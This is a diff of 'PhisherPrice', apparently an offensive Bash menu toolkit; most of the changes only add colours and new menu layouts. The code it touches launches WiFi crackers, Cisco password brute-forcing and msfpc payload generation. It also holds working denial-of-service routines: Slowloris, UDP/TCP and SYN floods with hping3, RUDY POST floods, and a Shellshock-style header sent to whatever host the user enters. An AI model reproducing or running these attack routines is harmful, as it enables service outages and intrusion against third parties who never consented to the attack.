-  echo -e "\nBully failed. Please make sure you have the necessary tools installed and try again."
+  echo -e "\n${red}Bully failed.${reset} Please make sure you have the necessary tools installed and try again."
   read -p "Press Enter to continue."
 fi
 
 echo -e "\n**************************************************"
-echo "******     Bullying complete     ******"
+echo "******     Bullying ${green}complete${reset}     ******"
 echo -e "**************************************************\n"
 
         ;;
       8)
         clear
 echo -e "\n**************************************************"
-echo "******     Fern Wifi-Cracker Launcher     ******"
+echo "******     ${cyan}Fern Wifi-Cracker${reset} Launcher     ******"
 echo -e "**************************************************\n"
 
 read -p "Are you sure you want to start Fern Wifi-Cracker? (y/n): " start_fern
@@ -2765,21 +2875,21 @@ read -p "Are you sure you want to start Fern Wifi-Cracker? (y/n): " start_fern
 if [[ $start_fern =~ ^[Yy]$ ]]; then
   clear
   echo -e "\n**************************************************"
-  echo "******     Starting Fern Wifi-Cracker     ******"
+  echo "******     ${green}Starting ${reset}Fern Wifi-Cracker     ******"
   echo -e "**************************************************\n"
 
   fern-wifi-cracker
 else
   clear
   echo -e "\n**************************************************"
-  echo "******     Operation cancelled     ******"
+  echo "******     ${red}Operation cancelled${reset}     ******"
   echo -e "**************************************************\n"
 fi
         ;;
       9)
         clear
 echo -e "\n**************************************************"
-echo "******     Easside-NG Launcher     ******"
+echo "******     ${cyan}Easside-NG ${reset}Launcher     ******"
 echo -e "**************************************************\n"
 
 read -p "Are you sure you want to start Easside-NG? (y/n): " easside_choice
@@ -2803,7 +2913,7 @@ if [[ $easside_choice =~ ^[Yy]$ ]]; then
   clear
   
   echo -e "\n**************************************************"
-  echo "******     Starting Fern Easside-NG     ******"
+  echo "******     ${green}Starting Fern Easside-NG${reset}     ******"
   echo -e "**************************************************\n"
   
   xterm -e "buddy-ng" &
@@ -2814,14 +2924,14 @@ if [[ $easside_choice =~ ^[Yy]$ ]]; then
 else
   
   echo -e "\n**************************************************"
-  echo "******     Operation cancelled     ******"
+  echo "******     ${red}Operation cancelled${reset}     ******"
   echo -e "**************************************************\n"
 fi
         ;;
       10)
         clear
 echo -e "\n**************************************************"
-echo "******        Kismet Launcher        ******"
+echo "******        ${cyan}Kismet ${reset}Launcher        ******"
 echo -e "**************************************************\n"
 
 read -p "Are you sure you want to start Kismet? (y/n): " kissmebaby
@@ -2829,7 +2939,7 @@ read -p "Are you sure you want to start Kismet? (y/n): " kissmebaby
 if [[ $kissmebaby =~ ^[Yy]$ ]]; then
   clear
   echo -e "\n**************************************************"
-  echo "******        Starting Kismet        ******"
+  echo "******        ${green}Starting${reset} Kismet        ******"
   echo "******  To Stop Kismet CTRL + C     ******"
   echo -e "**************************************************\n"
   
@@ -2837,7 +2947,7 @@ if [[ $kissmebaby =~ ^[Yy]$ ]]; then
 else
   clear
   echo -e "\n**************************************************"
-  echo "******     Operation cancelled     ******"
+  echo "******     ${red}Operation cancelled${reset}     ******"
   echo -e "**************************************************\n"
 fi
         ;;
@@ -2856,7 +2966,7 @@ if [[ $hpot =~ ^[Yy]$ ]]; then
 
   clear
   echo -e "\n**************************************************"
-  echo "******        Starting HoneyPot...      ******"
+  echo "******        ${green}Starting${reset} HoneyPot...      ******"
   echo -e "**************************************************\n"
 
   airmon-ng check kill
@@ -2868,7 +2978,7 @@ if [[ $hpot =~ ^[Yy]$ ]]; then
     sudo service network-manager restart
   else
     echo -e "\n**************************************************"
-    echo "******  Monitor mode has not been disabled. ******"
+    echo "******  Monitor mode ${red}has not been disabled.${reset} ******"
     echo -e "**************************************************\n"
   fi
 
@@ -2876,7 +2986,7 @@ if [[ $hpot =~ ^[Yy]$ ]]; then
 else
   clear
   echo -e "\n**************************************************"
-  echo "******        Operation cancelled        ******"
+  echo "******        ${red}Operation cancelled${reset}        ******"
   echo -e "**************************************************\n"
 fi
         ;;
@@ -2888,7 +2998,7 @@ fi
         ;;
         q|Q)
         clear
-        echo "Exiting PhisherPrice. Goodbye!"
+        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
         exit 0
         ;;
       *)
@@ -2903,31 +3013,28 @@ cisco() {
   while true
   do
 clear
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
-                   
-\e[0m\e[3;39m \e[1;31m
-Cisco Wifi Routers
-\e[3;39m
-(1) Cisco GE xPloit
-(2) Cisco Audit Tool
-
-Press q/Q To Exit
-Press b/B To Go To Back
-'
-echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Networking$Blue]:"
-read -r -p" └─────► " choice
+	
+echo -e "
+┌──────────────────────────────────────────────────────────┐
+│${red}Cisco Wifi Routers${reset}                                        │
+├──────────────────────────────────────────────────────────┤
+│${green}1${reset} │Cisco GE xPloit                                        │ 
+│${green}2${reset} │Cisco Audit Tool                                       │
+├──────────────────────────────────────────────────────────┤ 
+│    b/B To Go To Back ~ q/Q To Exit                       │
+"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Networking/Cisco$blue]:"$reset──────────────────┘"
+read -r -p"└─────► $reset" choice
     case $choice in
       1)
         clear
-echo -e '\e[1;33m
-_________   ________  ___________              .__         .__  __   
-\_   ___ \ /  _____/  \_   _____/__  _________ |  |   ____ |__|/  |_ 
-/    \  \//   \  ___   |    __)_\  \/  /\____ \|  |  /  _ \|  \   __\
-\     \___\    \_\  \  |        \>    < |  |_> >  |_(  <_> )  ||  |  
- \______  /\______  / /_______  /__/\_ \|   __/|____/\____/|__||__|  
-        \/        \/          \/      \/|__|                         \e[1;34m
-'  
+echo -e "${yellow}
+   __________________           __      _ __ 
+  / ____/ ____/ ____/  ______  / /___  (_) /_
+ / /   / / __/ __/ | |/_/ __ \/ / __ \/ / __/
+/ /___/ /_/ / /____>  </ /_/ / / /_/ / / /_  
+\____/\____/_____/_/|_/ .___/_/\____/_/\__/  
+                     /_/                     
+${reset}"  
 function validate_input {
     if ! [[ "$1" =~ ^[1-9][0-9]*$ && "$1" -le 14 ]]; then
         echo "Invalid option selected. Please select a number between 1 and 14."
@@ -2961,7 +3068,7 @@ echo "Do you have a password list? (y/n)"
 read -r has_password_list
 if [[ $has_password_list == "y" ]]; then
     echo "Please enter the location of your password list:"
-    read password_list
+    read password_list && echo "$password_list" >> ~/.bash_history 2>/dev/null
     password_option="-a $password_list"
 fi
 
@@ -2969,7 +3076,7 @@ echo "Do you have a user's list for name guessing? (y/n)"
 read -r has_user_list
 if [[ $has_user_list == "y" ]]; then
     echo "Please enter the location of your user list:"
-    read user_list
+    read user_list && echo "$user_list" >> ~/.bash_history 2>/dev/null
     user_option="-w $user_list"
 fi
 
@@ -3000,14 +3107,13 @@ guess_usernames() {
     fi
 }
 
-echo -e '\e[1;33m
-_________     ________________
-\_   ___ \   /  _  \__    ___/
-/    \  \/  /  /_\  \|    |   
-\     \____/    |    \    |   
- \______  /\____|__  /____|   
-        \/         \/         \e[1;34m
-'  
+echo -e "${yellow}
+   _________  ______
+  / ____/   |/_  __/
+ / /   / /| | / /   
+/ /___/ ___ |/ /    
+\____/_/  |_/_/     
+${reset}"  
 echo "Cisco Auditing Tool"
 
 echo "Enter the target IP address (e.g. 192.168.1.202): "
@@ -3023,7 +3129,7 @@ echo "Do you have a password list? (y/n): "
 read password_list_option
 if [[ "$password_list_option" == "y" ]]; then
     echo "Enter the location of your password list: "
-    read password_list_location
+    read password_list_location && echo "$password_list_location" >> ~/.bash_history 2>/dev/null
     if [[ ! -f "$password_list_location" ]]; then
         echo "Password list file not found. Exiting..."
         exit 1
@@ -3065,7 +3171,7 @@ check_ios_history
         ;;
         q|Q)
         clear
-        echo "Exiting PhisherPrice. Goodbye!"
+        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
         exit 0
         ;;
       *)
@@ -3080,66 +3186,67 @@ dostoolkit() {
   while true
   do
 clear
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
-                   
-\e[0m\e[3;39m \e[1;31m
-Denial-Of-Service Toolkit
-\e[3;39m
-(1) Check If Vuln To DoS
-(2) Slowloris Attack
-(3) UDP/TCP Flood Attack
-(4) R-U-Dead-Yet Attack
-(5) SYN flood attack
-
-Press q/Q To Exit
-Press b/B To Go To Back
-'
-echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"DoS-Toolkit$Blue]:"
-read -r -p" └─────► " choice
+	
+	echo -e "
+┌──────────────────────────────────────────────────────────┐
+│${red}Denial-Of-Service Toolkit${reset}                                 │
+├──────────────────────────────────────────────────────────┤
+│${green}1${reset} │Check If Vuln To DoS                                   │
+│${green}2${reset} │Slowloris Attack                                       │
+│${green}3${reset} │UDP/TCP Flood Attack                                   │
+│${green}4${reset} │R-U-Dead-Yet Attack                                    │
+│${green}5${reset} │SYN flood attack                                       │
+├──────────────────────────────────────────────────────────┤ 
+│    b/B To Go To Back ~ q/Q To Exit                       │
+"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"DoS-Toolkit$blue]:"$reset───────────────────────┘"
+read -r -p"└─────► $reset" choice
     case $choice in
       1)
         clear
 # Prompt user for hostname or IP address
-echo "Enter a hostname or IP address to check for vulnerabilities:"
-read -e target
+    echo "Enter a ${yellow}hostname${reset} or ${yellow}IP address${reset} to check for vulnerabilities:"
+    read -e target && echo "$target" >> ~/.bash_history 2>/dev/null
+    echo ""
+
+# Read user agents from file
+    user_agents=$(cat main/user_agents.txt)
 
 # Check for Slowloris attack
-echo "Checking for Slowloris attack..."
-if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" -H "Connection: close" -H "Accept-language: en-US,en,q=0.5" "${target}" | grep -q "4[0-9][0-9]\|5[0-9][0-9]"; then
-    echo "Slowloris attack detected!"
-else
-    echo "Slowloris attack not detected."
+    echo "Checking for Slowloris ${yellow}attack...${reset}"
+  if curl -A "$user_agents" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" -H "Connection: close" -H "Accept-language: en-US,en,q=0.5" "${target}" | grep -q "4[0-9][0-9]\|5[0-9][0-9]"; then
+    echo "Slowloris attack ${green}detected!${reset}"
+  else
+    echo "Slowloris attack ${red}not detected.${reset}"
 fi
 
 # Check for UDP/TCP Flood attack
-echo "Checking for UDP/TCP Flood attack..."
-if hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
-    echo "UDP/TCP Flood attack detected!"
-else
-    echo "UDP/TCP Flood attack not detected."
+    echo "Checking for UDP/TCP Flood ${yellow}attack...${reset}"
+  if hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
+    echo "UDP/TCP Flood attack ${green}detected!${reset}"
+  else
+    echo "UDP/TCP Flood attack ${red}not detected.${reset}"
 fi
 
 # Check for R-U-Dead-Yet attack
-echo "Checking for R-U-Dead-Yet attack..."
-if curl -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.5" -H "User-Agent: () { :; }; /bin/bash -c 'echo Vulnerable!'" -H "Connection: keep-alive" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" "${target}" | grep -q "5[0-9][0-9]"; then
-    echo "R-U-Dead-Yet attack detected!"
-else
-    echo "R-U-Dead-Yet attack not detected."
+    echo "Checking for R-U-Dead-Yet ${yellow}attack...${reset}"
+  if curl -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.5" -H "User-Agent: () { :; }; /bin/bash -c 'echo Vulnerable!'" -H "Connection: keep-alive" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" "${target}" | grep -q "5[0-9][0-9]"; then
+    echo "R-U-Dead-Yet attack ${green}detected!${reset}"
+  else
+    echo "R-U-Dead-Yet attack ${red}not detected.${reset}"
 fi
 
-# Check for SYN Flood attack
-echo "Checking for SYN Flood attack..."
-if hping3 -c 10000 -d 120 -S -w 64 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
-    echo "SYN Flood attack detected!"
-else
-    echo "SYN Flood attack not detected."
+    # Check for SYN Flood attack
+    echo "Checking for SYN Flood ${yellow}attack...${reset}"
+  if hping3 -c 10000 -d 120 -S -w 64 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
+    echo "SYN Flood attack ${green}detected!${reset}"
+  else
+    echo "SYN Flood attack ${red}not detected.${reset}"
 fi
         ;;
       2)
             clear
     echo "Slowloris Type Attack"
-    read -e -p "Enter the hostname or IP address of the target: " host
+    read -e -p "Enter the hostname or IP address of the target: " host && echo "$host" >> ~/.bash_history 2>/dev/null
     read -e -p "Enter the port number of the target: " port
     read -e -p "Enter the number of requests to send: " requests
     read -e -p "Enter the time to last (in seconds): " duration
@@ -3155,7 +3262,7 @@ fi
     read -p "Randomize User-Agent header? [y/n]: " randomize_ua
 
     if [[ $randomize_ua == "y" ]]; then
-      ua_flag="-H 'User-Agent: \$(shuf -n 1 user_agents.txt)'"
+      ua_flag="-H 'User-Agent: \$(shuf -n 1 main/user_agents.txt)'"
     else
       ua_flag=""
     fi
@@ -3179,32 +3286,32 @@ fi
       sleep 0.5
     done
 
-    echo "Slowloris attack on $host:$port finished."
+    echo "Slowloris ${red}attack${reset} on ${cyan}$host:${yellow}$port ${reset}finished."
         ;;
       3)
         clear
-echo "UDP/TCP Flood Attack with Multithreading and Randomization"
-echo "Example: 10.0.0.1 80 1024 60 50"
-read -p "IP" ip
+      echo "UDP/TCP Flood Attack with Multithreading and Randomization"
+      echo "Example: 10.0.0.1 80 1024 60 50"
+      read -p "IP" ip && echo "$ip" >> ~/.bash_history 2>/dev/null
 
-read -e -p "Port" port
+      read -e -p "Port" port
 
-read -e -p "Size of the packet to send" size
+      read -e -p "Size of the packet to send" size
 
-read -e -p "Time in seconds" t
+      read -e -p "Time in seconds" t
 
-read -e -p "Number of threads to use" threads
+      read -e -p "Number of threads to use" threads
 
-read -e -p "Do you want to randomize packet content? (y/n)" randomize_content
+      read -e -p "Do you want to randomize packet content? (y/n)" randomize_content
 
-read -e -p "Do you want to randomize delay between requests? (y/n)" randomize_delay
+      read -e -p "Do you want to randomize delay between requests? (y/n)" randomize_delay
 
-read -e -p "Which protocol do you want to use? (UDP/TCP)" protocol
+      read -e -p "Which protocol do you want to use? (UDP/TCP)" protocol
 
-endtime=$((SECONDS+t))
+  endtime=$((SECONDS+t))
 
 echo "~To cancel the attack press 'Ctrl-C'"
-echo "|IP|            |Port|            |Size|            |Time|            |Threads|            |Randomize Content|            |Randomize Delay|            |Protocol|"
+echo "|${cyan}IP${reset}|            |${cyan}Port${reset}|            |${cyan}Size${reset}|            |${cyan}Time${reset}|            |${cyan}Threads${reset}|            |${cyan}Randomize Content${reset}|            |${cyan}Randomize Delay${reset}|            |${cyan}Protocol${reset}|"
 echo "|$ip|            |$port|            |$size|            |$t|            |$threads|            |$randomize_content|            |$randomize_delay|            |$protocol|"
 
 function attack {
@@ -3232,37 +3339,37 @@ for ((i=0;i<$threads;i++)); do
   done
 done
 
-echo "Attack finished."
+echo "${green}Attack finished.${reset}"
         ;;
       4)
         clear
-echo "R-U-Dead-Yet (RUDY) Type Attack"
-echo "Example: example.com 80 1000 60"
-echo "Host"
-read -e host
+      echo "R-U-Dead-Yet (RUDY) Type Attack"
+      echo "Example: example.com 80 1000 60"
+      echo "Host"
+      read -e host && echo "$host" >> ~/.bash_history 2>/dev/null
 
-echo "Port"
-read -e port
+      echo "Port"
+      read -e port
 
-echo "Size of the payload in bytes"
-read -e payload_size
+      echo "Size of the payload in bytes"
+      read -e payload_size
 
-echo "Number of headers"
-read -e header_count
+      echo "Number of headers"
+      read -e header_count
 
-echo "Number of packets to send"
-read -e packet_count
+      echo "Number of packets to send"
+      read -e packet_count
 
-echo "Duration in seconds"
-read -e duration
+      echo "Duration in seconds"
+      read -e duration
 
 endtime=$((SECONDS+duration))
 
 echo "~To cancel the attack press 'Ctrl-C'"
-echo "|Hostname|            |Port|            |Payload Size|            |Header Count|            |Packet Count|            |Duration|"
+echo "|${cyan}Hostname${reset}|            |${cyan}Port${reset}|            |${cyan}Payload Size${reset}|            |${cyan}Header Count${reset}|            |${cyan}Packet Count${reset}|            |${cyan}Duration${reset}|"
 echo "|$host|            |$port|            |$payload_size|            |$header_count|            |$packet_count|            |$duration|"
 
-for ((i=0; i<packet_count; i++)); do
+while [ $SECONDS -lt $endtime ]; do
   headers=""
   for ((j=1; j<=header_count; j++)); do
     header_name=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
@@ -3270,32 +3377,33 @@ for ((i=0; i<packet_count; i++)); do
     headers+="\r\n$header_name: $header_value"
   done
   payload=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $payload_size | head -n 1)
-  curl -H "$headers" -d "$payload" -X POST "http://$host:$port" >/dev/null 2>&1
-  echo "Sent request $((i+1)) of $packet_count"
+  user_agent=$(shuf -n 1 main/user_agents.txt)
+  curl -A "$user_agent" -H "$headers" -d "$payload" -X POST "http://$host:$port" >/dev/null 2>&1
+  echo "Sent request at $(date)"
 done
 
-echo "Attack finished."
+echo "${green}Attack finished.${reset}"
         ;;
       5)
         clear
-        echo "SYN flood attack"
-echo "Example: example.com 80"
-echo "Host"
-read -e host
+      echo "SYN flood attack"
+      echo "Example: example.com 80"
+      echo "Host"
+      read -e host && echo "$host" >> ~/.bash_history 2>/dev/null
 
-echo "Port"
-read -e port
+      echo "Port"
+      read -e port
 
-echo "Number of packets to send"
-read -e packets
+      echo "Number of packets to send"
+      read -e packets
 
-echo "Packet size in bytes"
-read -e size
+      echo "Packet size in bytes"
+      read -e size
 
-echo "Window size"
-read -e window_size
+      echo "Window size"
+      read -e window_size
 
-echo "Sending $packets packets of size $size bytes with window size $window_size to $host on port $port"
+      echo "Sending ${yellow}$packets${reset} packets of size ${yellow}$size${reset} bytes with window size ${yellow}$window_size${reset} to ${green}$host${reset} on port ${green}$port${reset}"
 
 data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
 for ((i=1;i<=$packets;i++)); do
@@ -3307,14 +3415,14 @@ for ((i=1;i<=$packets;i++)); do
   hping3 -c 1 -d $size -F -w $window_size $host -p $port >/dev/null 2>&1
 done
 
-echo "Attack finished."
+echo "${green}Attack finished.${reset}"
         ;;
       b|B)
         return
         ;;
         q|Q)
         clear
-        echo "Exiting PhisherPrice. Goodbye!"
+        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
         exit 0
         ;;
       *)
@@ -3330,31 +3438,28 @@ submenu5() {
   while true
   do
 clear
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
-                   
-\e[0m\e[3;39m \e[1;31m
-Create Your Own Xsploit
-\e[3;39m
-(1) Windows
-(2) Linux
-(3) OSX
-(4) APK
-(5) ASP
-(6) ASPX
-(7) Bash
-(8) Java
-(9) Perl
-(10) PHP
-(11) Powershell
-(12) Python
-(13) Tomcat
-
-Press q/Q To Exit
-Press b/B To Go To Back
-'
-echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"CYO Xsploit$Blue]:"
-read -r -p" └─────► " choice
+	
+	echo -e "
+┌────────────────────────────────────────────┐
+│${red}Create Your Own Xsploit${reset}                     │
+├────────────────────────────────────────────┤
+│${green}1${reset}  │Windows                                 │
+│${green}2${reset}  │Linux                                   │
+│${green}3${reset}  │OSX                                     │
+│${green}4${reset}  │APK                                     │
+│${green}5${reset}  │ASP                                     │
+│${green}6${reset}  │ASPX                                    │
+│${green}7${reset}  │Bash                                    │
+│${green}8${reset}  │Java                                    │
+│${green}9${reset}  │Perl                                    │
+│${green}10${reset} │PHP                                     │
+│${green}11${reset} │Powershell                              │
+│${green}12${reset} │Python                                  │
+│${green}13${reset} │Tomcat                                  │
+├────────────────────────────────────────────┤
+│    b/B To Go To Back ~ q/Q To Exit         │
+"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"CYO Xsploit$blue]:"$reset─────────┘"
+read -r -p"└─────► $reset" choice
     case $choice in
       1)
 clear
@@ -3424,7 +3529,7 @@ msfpc tomcat bind 5555 verbose
         ;;
         q|Q)
         clear
-        echo "Exiting PhisherPrice. Goodbye!"
+        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
         exit 0
         ;;
       *)
@@ -3440,43 +3545,29 @@ submenu6() {
   while true
   do
 clear
-echo -e '\e[1;33m
-///,        ////
-\  /,      /  >.
- \  /,   _/  /.
-  \_  /_/   /.
-   \__/_   <    AutoExif Tool
-   /<<< \_\_  PhisherPrice
-  /,)^>>_._ \ 
-  (/   \\ /\\\
-       // //```
-======((`((====\e[1;34m
-'
- echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                 
-                   '
-echo -e '\e[1;31m Exif Tool AutoMated For Easy Conveinience             
-\e[3;39m
-(1) Read Image MetaData (Basic)
-(2) Read Image MetaData (Expert)
-(3) Read Imge MetaData (From Website)
-(4) Wipe Data From Image (Except JFIF Groups)
-(5) Wipe All GPS Data From Image
-(6) Wipe All MetaData From Image (Adds Comment Back In) 
-(7) Extract GPS from AVCH video 
-(8) Extract Info From Thumbnail
-(9) Wipe Photoshop MetaData
-(h/H) Help
-
-Press q/Q To Exit
-Press b/B To Go To Back
-'
-echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"AutoExif$Blue]:"
-read -r -p" └─────► " choice
+echo -e "
+┌────────────────────────────────────────────────────────────────────┐
+│${red}AutoExif${reset}                                                            │
+├────────────────────────────────────────────────────────────────────┤            
+│${green}1${reset}   │Read Image MetaData (Basic)                                    │
+│${green}2${reset}   │Read Image MetaData (Expert)                                   │
+│${green}3${reset}   │Read Imge MetaData (From Website)                              │
+│${green}4${reset}   │Wipe Data From Image (Except JFIF Groups)                      │
+│${green}5${reset}   │Wipe All GPS Data From Image                                   │
+│${green}6${reset}   │Wipe All MetaData From Image (Adds Comment Back In)            │
+│${green}7${reset}   │Extract GPS from AVCH video                                    │
+│${green}9${reset}   │Extract Info From Thumbnail                                    │
+│${green}10${reset}  │Wipe Photoshop MetaData                                        │
+│${green}h/H${reset} │Help                                                           │
+├────────────────────────────────────────────────────────────────────┤ 
+│    b/B To Go To Back ~ q/Q To Exit                                 │
+"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"AutoExif$blue]:"$reset────────────────────────────────────┘"
+read -r -p"└─────► $reset" choice
     case $choice in
       1)
       clear
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
-read -e meta1
+read -e meta1 && echo "$meta1" >> ~/.bash_history 2>/dev/null
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Extracting Data        !!!!!
@@ -3493,7 +3584,7 @@ echo -e '
       2)
       clear
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
-read -e mdeep
+read -e mdeep&& echo "$mdeep" >> ~/.bash_history 2>/dev/null
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Extracting Data        !!!!!
@@ -3510,7 +3601,7 @@ echo -e '
       3)
       clear
 echo "enter image location for eg: http://a.domain.com/bigfile.jpg"
-read -e exifop1host
+read -e exifop1host && echo "$exifop1host" >> ~/.bash_history 2>/dev/null
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Extracting Data        !!!!!
@@ -3527,7 +3618,7 @@ echo -e '
       4)
       clear
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
-read -e exifop4
+read -e exifop4 && echo "$exifop4" >> ~/.bash_history 2>/dev/null
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!       Wiping JFIF Data        !!!!!
@@ -3544,7 +3635,7 @@ echo -e '
       5)
       clear
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
-read -e exifop5
+read -e exifop5 && echo "$exifop5" >> ~/.bash_history 2>/dev/null
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Wiping GPS Data        !!!!!
@@ -3560,7 +3651,7 @@ echo -e '
       6)
       clear
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
-read -e exifop6
+read -e exifop6 && echo "$exifop6" >> ~/.bash_history 2>/dev/null
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Replacing Data         !!!!!
@@ -3577,7 +3668,7 @@ echo -e '
       7)
       clear
 echo "enter image name followed by its file type eg: /home/username/Videos/lulz.m2ts"
-read -e avch
+read -e avch && echo "$avch" >> ~/.bash_history 2>/dev/null
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !        EXTRACTING PLEASE WAIT        !
@@ -3595,7 +3686,7 @@ echo -e '
       8)
       clear
 echo "enter image name followed by its file type eg: /home/username/pictures/lulz.png"
-read -e exif8
+read -e exif8 && echo "$exif8" >> ~/.bash_history 2>/dev/null
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !        EXTRACTING PLEASE WAIT        !
@@ -3616,7 +3707,7 @@ echo -e '
 Delete Photoshop meta information from an image (note that the Photoshop informatio nalso includes IPTC).
 enter image name followed by its file type eg: /home/username/pictures/lulz.jpg
 '
-read -e psd
+read -e psd && echo "$psd" >> ~/.bash_history 2>/dev/null
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !        EXTRACTING PLEASE WAIT        !
@@ -3650,7 +3741,7 @@ read -p "Press Enter to continue."
         ;;
         q|Q)
         clear
-        echo "Exiting PhisherPrice. Goodbye!"
+        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
         exit 0
         ;;
       *)
